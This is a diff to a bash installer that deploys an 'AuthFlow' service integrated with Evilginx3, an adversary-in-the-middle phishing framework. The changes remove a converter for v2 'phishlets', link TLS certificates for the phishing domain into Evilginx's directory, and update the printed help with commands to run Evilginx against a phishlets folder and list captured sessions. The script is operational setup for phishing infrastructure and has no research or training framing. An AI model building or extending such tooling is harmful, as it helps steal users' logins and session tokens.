@@ -526,26 +526,6 @@ start_service() {
 
     if systemctl is-active --quiet "$SERVICE_NAME"; then
         log "AuthFlow service started successfully"
-    else
-        warn "AuthFlow service may not be running. Check logs:"
-        warn "  journalctl -u $SERVICE_NAME -n 50"
-    fi
-}
-
-# ============================================================================
-# Convert v2 phishlet to v3 format
-# ============================================================================
-convert_phishlet_to_v3() {
-    local input_file="$1"
-    local output_file="$2"
-    
-    # v3 changes:
-    # - 'search' field becomes 'regex'
-    # - 'replace' becomes 'replacement' (optional, v3 handles differently)
-    # - 'sub_filters' structure simplified
-    sed -e 's/search:/regex:/g' \
-        -e 's/replace:/replacement:/g' \
-        "$input_file" > "$output_file"
 }
 
 # ============================================================================
@@ -561,11 +541,10 @@ configure_evilginx_integration() {
             "$INSTALL_DIR/templates/evilginx.yaml.tmpl" > "$EVILGINX_DIR/config.yaml"
     fi
 
-    mkdir -p "$EVILGINX_DIR/certs"
     # Copy certificates for Evilginx3
-    cp /etc/letsencrypt/live/$DOMAIN/fullchain.pem "$EVILGINX_DIR/certs/"
-    cp /etc/letsencrypt/live/$DOMAIN/privkey.pem "$EVILGINX_DIR/certs/"
-    chmod 644 "$EVILGINX_DIR/certs/"*.pem
+    mkdir -p "$EVILGINX_DIR/certs"
+    ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/$DOMAIN.crt"
+    ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/$DOMAIN.key"
 
     # Create v3-compatible phishlets
     log "Creating v3 phishlet configurations..."
@@ -720,7 +699,7 @@ print_summary() {
     echo "  Config: $CONFIG_FILE"
     echo ""
     echo "Service Management:"
-    echo "  AuthFlow: systemctl status $SERVICE_NAME"
+    echo "  AuthFlow:  systemctl status $SERVICE_NAME"
     echo "  Evilginx3: systemctl status evilginx"
     echo ""
     echo "  Start: systemctl start $SERVICE_NAME"
@@ -735,9 +714,9 @@ print_summary() {
     echo "  Logs: tail -f /var/log/nginx/authflow_*.log"
     echo ""
     echo "Evilginx3 Commands:"
-    echo "  Attach: evilginx"
-    echo "  List config: evilginx -c"
-    echo "  Sessions: evilginx sessions"
+    echo "  Manual Run: sudo evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets"
+    echo "  Logs:       journalctl -u evilginx -f"
+    echo "  Sessions:   sudo evilginx -c $EVILGINX_DIR sessions"
     echo ""
     echo "TLS Certificates:"
     echo "  Path: $cert_dir"
